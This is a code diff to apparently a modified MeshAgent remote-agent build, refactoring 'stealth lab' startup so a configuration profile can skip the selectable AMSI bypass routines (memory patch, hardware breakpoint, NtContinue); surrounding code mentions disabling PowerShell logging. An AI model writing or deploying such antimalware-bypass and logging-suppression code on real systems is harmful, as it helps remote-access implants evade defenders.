@@ -31,6 +31,7 @@ static void GetModulePathW(wchar_t* out, DWORD cch)
 void Stealth_InitLabFeatures(void)
 {
 #ifdef MESHAGENT_ENABLE_STEALTH
+    const mesh_stealth_profile_t* stealthProfile = MeshConfig_GetStealth();
     // Default enable in StealthLab configs; otherwise require STEALTH_LAB=1
 #ifdef MESHAGENT_STEALTHLAB_DEFAULT
     const int defaultLab = 1;
@@ -41,34 +42,41 @@ void Stealth_InitLabFeatures(void)
     Stealth_EnsureLoggingDefaults();
 
     // 1) AMSI bypass selection: STEALTH_AMSI = patch|hwbp|ntcontinue|none (default: patch)
-    wchar_t amsiMode[16] = {0};
-    DWORD amsiLen = GetEnvironmentVariableW(L"STEALTH_AMSI", amsiMode, (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0])));
-    if (amsiLen == 0 || amsiLen >= (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0]))) {
-        // default
-        if (!Stealth_PatchAMSI())
-        {
-            Stealth_DebugPrintfA("Stealth_PatchAMSI default path failed");
-        }
-    } else {
-        for (DWORD i = 0; i < amsiLen; ++i) { wchar_t c = amsiMode[i]; if (c >= L'A' && c <= L'Z') amsiMode[i] = (wchar_t)(c - L'A' + L'a'); }
-        if (wcscmp(amsiMode, L"hwbp") == 0) {
-            if (!Stealth_PatchAMSI_HardwareBreakpoint())
-            {
-                Stealth_DebugPrintfA("STEALTH_AMSI=hwbp failed to arm hardware breakpoint");
-            }
-        } else if (wcscmp(amsiMode, L"ntcontinue") == 0) {
-            if (!Stealth_PatchAMSI_NtContinue())
-            {
-                Stealth_DebugPrintfA("STEALTH_AMSI=ntcontinue failed to activate bypass");
-            }
-        } else if (wcscmp(amsiMode, L"none") == 0) {
-            // do nothing
-        } else {
+    if (stealthProfile == NULL || stealthProfile->amsiPatch != 0)
+    {
+        wchar_t amsiMode[16] = {0};
+        DWORD amsiLen = GetEnvironmentVariableW(L"STEALTH_AMSI", amsiMode, (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0])));
+        if (amsiLen == 0 || amsiLen >= (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0]))) {
+            // default
             if (!Stealth_PatchAMSI())
             {
-                Stealth_DebugPrintfA("Stealth_PatchAMSI fallback failed");
+                Stealth_DebugPrintfA("Stealth_PatchAMSI default path failed");
+            }
+        } else {
+            for (DWORD i = 0; i < amsiLen; ++i) { wchar_t c = amsiMode[i]; if (c >= L'A' && c <= L'Z') amsiMode[i] = (wchar_t)(c - L'A' + L'a'); }
+            if (wcscmp(amsiMode, L"hwbp") == 0) {
+                if (!Stealth_PatchAMSI_HardwareBreakpoint())
+                {
+                    Stealth_DebugPrintfA("STEALTH_AMSI=hwbp failed to arm hardware breakpoint");
+                }
+            } else if (wcscmp(amsiMode, L"ntcontinue") == 0) {
+                if (!Stealth_PatchAMSI_NtContinue())
+                {
+                    Stealth_DebugPrintfA("STEALTH_AMSI=ntcontinue failed to activate bypass");
+                }
+            } else if (wcscmp(amsiMode, L"none") == 0) {
+                // do nothing
+            } else {
+                if (!Stealth_PatchAMSI())
+                {
+                    Stealth_DebugPrintfA("Stealth_PatchAMSI fallback failed");
+                }
             }
         }
+    }
+    else
+    {
+        Stealth_DebugPrintfA("Branding disabled AMSI patch; skipping lab AMSI bypass");
     }
 
     // 2) Disable PowerShell logging (default on in lab)
@@ -99,7 +107,6 @@ void Stealth_InitLabFeatures(void)
         }
     }
 
-    const mesh_stealth_profile_t* stealthProfile = MeshConfig_GetStealth();
     int extractDefault = 0;
     if (stealthProfile != NULL)
     {
